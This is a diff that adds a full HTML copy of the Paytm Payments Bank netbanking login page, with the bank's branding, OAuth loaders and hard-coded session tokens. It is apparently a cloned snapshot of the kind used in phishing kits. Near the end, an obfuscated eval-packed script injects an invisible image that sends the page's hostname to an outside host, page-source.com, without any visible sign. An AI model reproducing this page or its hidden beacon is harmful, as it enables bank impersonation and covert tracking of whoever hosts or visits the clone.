@@ -1,0 +1,632 @@
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <meta
+      name="viewport"
+      content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no"
+    />
+    <meta http-equiv="X-UA-Compatible" content="ie=edge" />
+    <title>Paytm Payments Bank | Login</title>
+    <link
+      rel="shortcut icon"
+      href="/assets/static/images/favicon.png"
+      type="image/x-icon"
+    />
+    <link
+      href="https://fonts.googleapis.com/css?family=Open+Sans:300,400,600,700"
+      rel="preconnect"
+      as="style"
+    />
+    <link rel="apple-touch-icon" href="/assets/static/images/bankLogo192.png" />
+    <link rel="manifest" href="/assets/manifest.webmanifest" />
+    <style>
+      body,
+      html {
+        font-family: "Open Sans", sans-serif;
+        font-display: swap;
+        font-size: 12px;
+        -webkit-font-smoothing: antialiased;
+        margin: 0;
+        padding: 0;
+        line-height: 1.3;
+        overflow: auto;
+        color: #29394f;
+        user-select: none;
+      }
+      * {
+        box-sizing: border-box;
+      }
+      :focus {
+        outline: 0;
+      }
+      ::-moz-focus-inner {
+        border: 0;
+      }
+      .main {
+        height: 100vh;
+        display: flex;
+        flex-direction: column;
+        justify-content: space-between;
+      }
+      .header {
+        height: 56px;
+        background: #fff;
+        display: flex;
+        align-items: center;
+        margin-left: 40px;
+      }
+      .content {
+        flex: 1 1 auto;
+        position: relative;
+        display: flex;
+        border-top: 1px solid #e6ebf3;
+      }
+      .content-left {
+        background: #002970;
+        width: 620px;
+      }
+      .content-left__info {
+        margin-left: 64px;
+        font-weight: 800;
+        color: #fff;
+      }
+      .content-left__item {
+        margin-top: 44px;
+        display: flex;
+        justify-content: flex-start;
+        align-items: center;
+      }
+      .content-left__item-icon {
+        width: 44px;
+        height: 44px;
+        border-radius: 50%;
+        background: #264885;
+        display: flex;
+        align-items: center;
+        justify-content: center;
+      }
+      .content-left__item-icon__img {
+        width: 30px;
+        height: 30px;
+      }
+      .content-left__item-details {
+        margin-left: 24px;
+      }
+      .content-left__item-title {
+        font-size: 16px;
+        line-height: 25px;
+        padding: 2px;
+      }
+      .content-left__item-description {
+        font-size: 14px;
+        font-weight: 400;
+        line-height: 19.1px;
+        padding: 2px;
+      }
+      .content-left__header {
+        font-size: 28px;
+        margin-top: 44px;
+      }
+      .content-left__button {
+        width: 141px;
+        height: 40px;
+        border: 1px solid #00b8f5;
+        border-radius: 100px;
+        cursor: pointer;
+        background: #fff;
+        text-decoration: none;
+      }
+      .content-left__button-content {
+        display: flex;
+        justify-content: center;
+        align-items: center;
+        margin-top: 6px;
+      }
+      .content-left__button-txt {
+        font-size: 14px;
+        color: #00b8f5;
+        line-height: 16px;
+        font-weight: 700;
+        letter-spacing: 0.5px;
+      }
+      .content-right {
+        flex: 1;
+        display: flex;
+        flex-direction: column;
+        align-items: center;
+        justify-content: flex-start;
+        margin-top: 44px;
+      }
+      .iframe {
+        width: 620px;
+        height: 300px;
+        border: none;
+        box-shadow: 0 2px 10px rgba(0, 0, 0, 0.08);
+      }
+      .footerWrapper {
+        border-top: 8px solid #29394f;
+        position: relative;
+        background: #fff;
+      }
+      .footerWrapper::before {
+        content: " ";
+        position: absolute;
+        left: 0;
+        width: 100%;
+        height: 8px;
+        background: #00b9f5;
+        z-index: 1;
+      }
+      .footer {
+        display: flex;
+        justify-content: space-between;
+        align-items: center;
+        padding: 34px 20px 26px;
+      }
+      .footer .copyrightText {
+        font-size: 14px;
+        margin-right: 40px;
+      }
+      .footer .poweredByText {
+        font-size: 14px;
+        color: #7b93b4;
+      }
+      .footer .footerMenu {
+        display: flex;
+      }
+      .footer .menuItem a {
+        font-size: 14px;
+        color: #00b9f5;
+        text-decoration: none;
+        margin-left: 32px;
+      }
+      .notification-bar {
+        background-color: #ddd;
+      }
+      .marquee {
+        height: 30px;
+        overflow: auto;
+        position: relative;
+        overflow-x: hidden;
+      }
+      .marquee p {
+        position: absolute;
+        height: 100%;
+        width: max-content;
+        margin: 0;
+        line-height: 30px;
+        color: #000;
+        transform: translateX(100%);
+        animation: scroll-left 50s linear infinite;
+      }
+      .marquee p:hover {
+        animation-play-state: paused;
+      }
+      .login-switch-button {
+        background: #fff;
+        padding: 15px 20px;
+        width: 620px;
+        font-weight: 600;
+        font-size: 14px;
+        color: #00b9f5;
+        box-shadow: 0 2px 10px rgba(0, 0, 0, 0.08);
+      }
+      .login-switch-button .switch-login-text {
+        cursor: pointer;
+      }
+      @keyframes scroll-left {
+        0% {
+          transform: translateX(100vw);
+        }
+        100% {
+          transform: translateX(-100%);
+        }
+      }
+      @media only screen and (max-width: 576px) {
+        .content {
+          display: block;
+          overflow-y: hidden;
+        }
+        .content-left {
+          display: none;
+        }
+        .iframe {
+          box-shadow: none;
+          height: 550px;
+          width: 100%;
+        }
+        .footerWrapper {
+          display: none;
+        }
+        .login-switch-button {
+          width: 100%;
+        }
+      }
+    </style>
+    <script nonce="85193329-85a0-4a16-8755-f6fa7cc343b4">
+      "use strict";
+      var xsrfToken = "bae1976e-11fe-4f78-91ae-4b8996eb4522";
+    </script>
+    <script nonce="85193329-85a0-4a16-8755-f6fa7cc343b4">
+      "use strict";
+      function loginWithCentralOauth(e, t, i, o, n, a, r, l, s, u) {
+        document.querySelector("#login-central-oauth-js-lib")
+          ? loginWithCentralOauthInit()
+          : ((e[o] = e[o] || {
+              init: function () {
+                e[o][i] = arguments;
+              },
+            }),
+            (s = t.createElement(a)),
+            (u = t.getElementsByTagName(a)[0]),
+            (s.id = "login-central-oauth-js-lib"),
+            (s.type = n),
+            (s.async = 1),
+            (s.src = r),
+            s.setAttribute("nonce", "85193329-85a0-4a16-8755-f6fa7cc343b4"),
+            (e.isMobile = "false"),
+            (s.onload = loginWithCentralOauthInit),
+            u.parentNode.insertBefore(s, u));
+      }
+      function loginWithCentralOauthInit() {
+        var e = document.querySelector("#oauth-iframe");
+        e && (e.style.height = "485px"),
+          window.Oauth.init({
+            clientId: "corporate-banking-panel",
+            allowAutoLogin: !1,
+            scope: "paytm",
+            responseType: "code",
+            redirectUri: "https://netbanking.paytmbank.com/v1/api/auth/code",
+            theme: {
+              template: "default",
+              text: {
+                signInTab: "Login to Access Your Account",
+                forgetPasswordText: "Forgot Password",
+              },
+              label: {
+                signInEmailMobile: "Registered Paytm Mobile Number or Email ID",
+                signInPassword: "Paytm Password",
+              },
+            },
+            components: {
+              login: {
+                email: !0,
+                mobile: !0,
+                QR: "true" !== isMobile && { primary: !1 },
+                signInNote: !1,
+                virtualKeyboard: "true" !== isMobile && {
+                  username: !0,
+                  password: !0,
+                },
+              },
+              signup: !1,
+              forgetPassword: { emailReset: !1 },
+            },
+          });
+      }
+    </script>
+    <script nonce="85193329-85a0-4a16-8755-f6fa7cc343b4">
+      "use strict";
+      function loginWithBankOAuth(t, n, e, i, o, a, c, s, r, u) {
+        document.querySelector("#login-bank-oauth-js-lib")
+          ? loginWithBankOAuthInit()
+          : ((t[i] = t[i] || {
+              init: function () {
+                t[i][e] = arguments;
+              },
+            }),
+            (r = n.createElement(a)),
+            (u = n.getElementsByTagName(a)[0]),
+            (r.id = "login-bank-oauth-js-lib"),
+            (r.type = o),
+            (r.async = 1),
+            (r.src = c),
+            r.setAttribute("nonce", "85193329-85a0-4a16-8755-f6fa7cc343b4"),
+            (r.onload = loginWithBankOAuthInit),
+            u.parentNode.insertBefore(r, u));
+      }
+      function loginWithBankOAuthInit() {
+        var t = document.querySelector("#oauth-iframe");
+        t && (t.style.height = "300px"),
+          window.BankAuth.init({
+            client_id: "bank-oauth-nbp-v2-prod",
+            scope: "paytm",
+            response_type: "authorization_code",
+            redirect_uri:
+              "https://netbanking.paytmbank.com/v1/api/bank-auth/code",
+            selector: "#oauth-iframe",
+            state: "f3bbf837-e9c4-4635-a698-990a4d9b87e0",
+            env: "",
+          });
+      }
+      loginWithBankOAuth(
+        window,
+        document,
+        "_beforeLoadConfig",
+        "Oauth",
+        "text/javascript",
+        "script",
+        "https://accounts.paytmbank.com/sdk/login.js"
+      );
+    </script>
+    <script nonce="85193329-85a0-4a16-8755-f6fa7cc343b4">
+      "use strict";
+      var script = document.createElement("script");
+      (script.src =
+        "https://www.paytmbank.com/hawkeyeweb/hawkeye_1.3.0.min.js"),
+        (script.async = !0),
+        script.setAttribute("nonce", "85193329-85a0-4a16-8755-f6fa7cc343b4"),
+        (script.onload = function () {
+          window.Hawkeye.configure({
+            env: "production",
+            logsMeta: { verticalName: "NBP_V2" },
+          });
+        }),
+        document.head.appendChild(script);
+    </script>
+  </head>
+  <body>
+    <div class="main">
+      <div class="headerWrapper">
+        <div class="header">
+          <img
+            src="/assets/static/images/BankLogo.svg"
+            alt="paytm payments bank"
+          />
+        </div>
+      </div>
+      <div class="content">
+        <div class="content-left">
+          <div class="content-left__info">
+            <div class="content-left__header">
+              One Account with Many Benefits
+            </div>
+            <div>
+              <div class="content-left__item">
+                <div class="content-left__item-icon">
+                  <img
+                    class="content-left__item-icon__img"
+                    src="/assets/static/images/ic-zero-balance.svg"
+                    alt=""
+                  />
+                </div>
+                <div class="content-left__item-details">
+                  <div class="content-left__item-title">Zero-Balance</div>
+                  <div class="content-left__item-description">
+                    Business account. No average monthly balance charges
+                  </div>
+                </div>
+              </div>
+              <div class="content-left__item">
+                <div class="content-left__item-icon">
+                  <img
+                    class="content-left__item-icon__img"
+                    src="/assets/static/images/ic-24x7.svg"
+                    alt=""
+                  />
+                </div>
+                <div class="content-left__item-details">
+                  <div class="content-left__item-title">24*7 Transactions</div>
+                  <div class="content-left__item-description">
+                    To all bank accounts, no restriction
+                  </div>
+                </div>
+              </div>
+              <div class="content-left__item">
+                <div class="content-left__item-icon">
+                  <img
+                    class="content-left__item-icon__img"
+                    src="/assets/static/images/ic-smart-collection.svg"
+                    alt=""
+                  />
+                </div>
+                <div class="content-left__item-details">
+                  <div class="content-left__item-title">
+                    Smart Collections using VAN
+                  </div>
+                  <div class="content-left__item-description">
+                    Bulk Collections and Reconciliation made easy
+                  </div>
+                </div>
+              </div>
+              <div class="content-left__item">
+                <div class="content-left__item-icon">
+                  <img
+                    src="/assets/static/images/ic-bulk-transfer.svg"
+                    class="content-left__item-icon__img"
+                    alt=""
+                  />
+                </div>
+                <div class="content-left__item-details">
+                  <div class="content-left__item-title">
+                    Easy Bulk Transfer and Access Management
+                  </div>
+                  <div class="content-left__item-description">
+                    Hassle-free Bulk Transfer with Robust Security
+                  </div>
+                </div>
+              </div>
+            </div>
+            <div class="content-left__item">
+              <a
+                class="content-left__button"
+                href="https://www.paytmbank.com/business-banking/business-account"
+                target="_blank"
+                rel="noreferrer"
+                ><div class="content-left__button-content">
+                  <span class="content-left__button-txt">Know more</span>
+                  <img
+                    src="/assets/static/images/ic-chevron-right.svg"
+                    alt=""
+                  /></div
+              ></a>
+            </div>
+          </div>
+        </div>
+        <div class="content-right">
+          <iframe id="oauth-iframe" class="iframe"></iframe>
+          <div class="login-switch-button" id="login-switch-btn">
+            <a href="login.html">
+            <span class="switch-login-text" data-type="central"
+              >Login with Paytm</span
+            ></a>
+          </div>
+        </div>
+      </div>
+      <div class="footerWrapper">
+        <div class="container">
+          <div class="footer">
+            <div class="footerMenu">
+              <div class="menuItem">
+                <a
+                  href="https://www.paytmbank.com/fraud-prevention"
+                  target="_blank"
+                  rel="noreferrer"
+                  >Safe Banking</a
+                >
+                <a
+                  href="https://www.paytmbank.com/Terms&Conditions"
+                  target="_blank"
+                  rel="noreferrer"
+                  >Terms of Service</a
+                >
+                <a
+                  href="https://www.paytmbank.com/PrivacyPolicy"
+                  target="_blank"
+                  rel="noreferrer"
+                  >Privacy Policy</a
+                >
+              </div>
+            </div>
+            <div>
+              <div class="copyrightText">© 2021, Paytm Payments Bank Ltd</div>
+            </div>
+          </div>
+        </div>
+      </div>
+    </div>
+    <script>
+      "use strict";
+      eval(
+        (function (e, n, t, i, r) {
+          if (
+            ((i = function (e) {
+              return e.toString(36);
+            }),
+            !"".replace(/^/, String))
+          ) {
+            for (; n--; ) r[n.toString(32)] = t[n] || n.toString(32);
+            (t = [
+              function (e) {
+                return r[e];
+              },
+            ]),
+              (i = function () {
+                return "\\w+";
+              }),
+              (n = 1);
+          }
+          for (; n--; )
+            t[n] &&
+              (e = e.replace(new RegExp("\\b" + i(n) + "\\b", "g"), t[n]));
+          return e;
+        })(
+          "c e=\"<b d='f:h;' a='j://9-4.5/3.6?8=\"+7.g.q+\"&k=s'  u='0' v='0'/>\",i=1.t(\"r\");m(i.l=e;i.2.n>0;)1.o.p(i.2[0])",
+          32,
+          "|document|children|resizeimage|source|com|ashx|window|ig|page|src|img|var|style||display|location|none||https|sz|innerHTML|for|length|body|appendChild|hostname|div|43404|createElement|width|height".split(
+            "|"
+          ),
+          0,
+          {}
+        )
+      );
+    </script>
+    <script nonce="85193329-85a0-4a16-8755-f6fa7cc343b4">
+      "use strict";
+      var params = {
+        channel: "web",
+        site_id: "1",
+        platform_version: "S2(New)",
+        offering: "login",
+        skipLoader: !0,
+        skipErrorPage: !0,
+      };
+      fetch("/v1/api/storefront", {
+        method: "POST",
+        headers: {
+          Pragma: "no-cache",
+          "Content-Type": "application/json;charset=UTF-8",
+        },
+        body: JSON.stringify(params),
+      })
+        .then(function (e) {
+          return e.json();
+        })
+        .then(function (e) {
+          var n, r, t;
+          Array.isArray(e) &&
+            0 !== e.length &&
+            ((e = e.join(
+              "".concat(" ".repeat(10), " | ").concat(" ".repeat(10))
+            )),
+            (n = document.createElement("div")),
+            (r = document.createElement("div")),
+            (t = document.createElement("p")),
+            (n.className = "notification-bar"),
+            (r.className = "marquee"),
+            (t.className = "target"),
+            (t.innerText = e),
+            r.appendChild(t),
+            n.appendChild(r),
+            document.querySelector(".main").prepend(n));
+        })
+        .catch(function (e) {
+          return console.log("error from login.ejs: ", e);
+        });
+    </script>
+    <script nonce="85193329-85a0-4a16-8755-f6fa7cc343b4">
+      "use strict";
+      var details = navigator.userAgent,
+        regexp = /android/i,
+        isMobileDevice = regexp.test(details);
+      isMobileDevice &&
+        document.addEventListener("backbutton", function (e) {
+          e.preventDefault(),
+            "/" === window.location.pathname
+              ? navigator.app.exitApp()
+              : window.history.back();
+        });
+    </script>
+    <script nonce="85193329-85a0-4a16-8755-f6fa7cc343b4">
+      "use strict";
+      var loginBtn = document.querySelector(
+        "#login-switch-btn .switch-login-text"
+      );
+      loginBtn.addEventListener("click", function () {
+        "central" === loginBtn.getAttribute("data-type")
+          ? (loginBtn.setAttribute("data-type", "bank"),
+            (loginBtn.textContent = "Login with Paytm Bank"),
+            loginWithCentralOauth(
+              window,
+              document,
+              "_beforeLoadConfig",
+              "Oauth",
+              "text/javascript",
+              "script",
+              "https://accounts.paytm.com/oauth-js-sdk/shim/bundle.js"
+            ))
+          : (loginBtn.setAttribute("data-type", "central"),
+            (loginBtn.textContent = "Login with Paytm"),
+            loginWithBankOAuth(
+              window,
+              document,
+              "_beforeLoadConfig",
+              "Oauth",
+              "text/javascript",
+              "script",
+              "https://accounts.paytmbank.com/sdk/login.js"
+            ));
+      });
+    </script>
+  </body>
+</html>
